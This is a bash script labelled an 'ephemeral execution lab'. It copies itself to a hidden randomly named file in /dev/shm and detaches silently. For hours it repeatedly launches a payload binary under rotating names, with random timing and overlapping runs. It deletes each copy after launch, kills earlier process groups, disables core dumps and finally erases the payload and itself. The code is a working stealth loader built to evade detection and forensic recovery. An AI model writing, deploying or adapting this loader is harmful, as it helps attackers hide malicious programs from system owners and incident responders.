#!/bin/bash
# =====================================================================
# god-ram.sh - Linux process behaviour and ephemeral execution lab
# =====================================================================

MIGRATED_MARKER="__MIGRATED__"

rand_int() {
    local max="$1"
    echo $((RANDOM % max))
}

if [ "$1" != "$MIGRATED_MARKER" ]; then
    # Parse runtime argument (in hours, default 6)
    RUNTIME_HOURS="${1:-6}"

    # Validate it's a number
    if ! [[ "$RUNTIME_HOURS" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
        echo "Error: Runtime must be a number (hours)" >&2
        echo "Usage: $0 [hours]" >&2
        echo "Example: $0 8    # Run for 8 hours" >&2
        exit 1
    fi

    printf -v RAND_HEX "%08x" "$(( (RANDOM << 16) | RANDOM ))"
    STABLE_LOC="/dev/shm/.sys${RAND_HEX}"
    cp "$0" "$STABLE_LOC" || exit 1
    chmod 700 "$STABLE_LOC" || exit 1
    nohup setsid "$STABLE_LOC" "$MIGRATED_MARKER" "$RUNTIME_HOURS" </dev/null >/dev/null 2>&1 &
    exit 0
fi

# Extract runtime from argument (passed during migration)
RUNTIME_HOURS="${2:-6}"

exec > /dev/null 2>&1
ulimit -c 0
umask 077
export DISPLAY=:0
export XAUTHORITY="${XAUTHORITY:-$HOME/.Xauthority}"
export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(id -u)/bus"

SELF_PATH="$(realpath "$0")"
PAYLOAD_SRC="/dev/shm/home_work/payload.bin"
PAYLOAD_STABLE="/dev/shm/.xbin$$"

if [ -f "$PAYLOAD_SRC" ]; then
    cp "$PAYLOAD_SRC" "$PAYLOAD_STABLE" || exit 1
    chmod +x "$PAYLOAD_STABLE"
else
    rm -f "$SELF_PATH"
    exit 0
fi

cd /dev/shm || exit 1

START=$(date +%s)
BASE=$(awk "BEGIN {print int($RUNTIME_HOURS * 3600)}")
JITTER=120
TOTAL_TIME=$(( BASE + $(rand_int $((2 * JITTER + 1))) - JITTER ))
if [ "$TOTAL_TIME" -lt 60 ]; then
    TOTAL_TIME=60
fi
END=$((START + TOTAL_TIME))

CURRENT_PAYLOAD_PID=0
CREATED_PAYLOADS=""

while [ "$(date +%s)" -lt "$END" ]; do
    [ ! -f "$PAYLOAD_STABLE" ] && break

    RAND_SUFFIX="$(rand_int 3)"
    PAYLOAD="/dev/shm/ex0$RAND_SUFFIX"

    cp "$PAYLOAD_STABLE" "$PAYLOAD" || break
    chmod +x "$PAYLOAD"
    CREATED_PAYLOADS="${CREATED_PAYLOADS}${PAYLOAD}"$'\n'

    RUN_FOR=$(( $(rand_int 301) + 180 ))

    JUNK_SLEEP="$(rand_int 2)"
    [ "$JUNK_SLEEP" -eq 0 ] && sleep "$(rand_int 3)"

    nohup setsid "$PAYLOAD" >/dev/null 2>&1 </dev/null &
    NEW_PAYLOAD_PID=$!

    [ "$(rand_int 3)" -eq 0 ] && ( sleep 2 & )

    OVERLAP_TIME=$(( $(rand_int 3) + 3 ))
    sleep "$OVERLAP_TIME"

    rm -f "$PAYLOAD"

    if [ "$CURRENT_PAYLOAD_PID" -ne 0 ]; then
        kill -9 -$CURRENT_PAYLOAD_PID 2>/dev/null
        wait "$CURRENT_PAYLOAD_PID" 2>/dev/null
    fi

    CURRENT_PAYLOAD_PID=$NEW_PAYLOAD_PID

    REMAINING_TIME=$((RUN_FOR - OVERLAP_TIME))
    [ "$REMAINING_TIME" -gt 0 ] && sleep "$REMAINING_TIME"
done

if [ "$CURRENT_PAYLOAD_PID" -ne 0 ]; then
    kill -9 -$CURRENT_PAYLOAD_PID 2>/dev/null
    wait "$CURRENT_PAYLOAD_PID" 2>/dev/null
fi

sleep 2

while IFS= read -r payload_path; do
    [ -n "$payload_path" ] && rm -f "$payload_path"
done <<< "$CREATED_PAYLOADS"

rm -f "$PAYLOAD_STABLE"
rm -f "$SELF_PATH"

exit 0
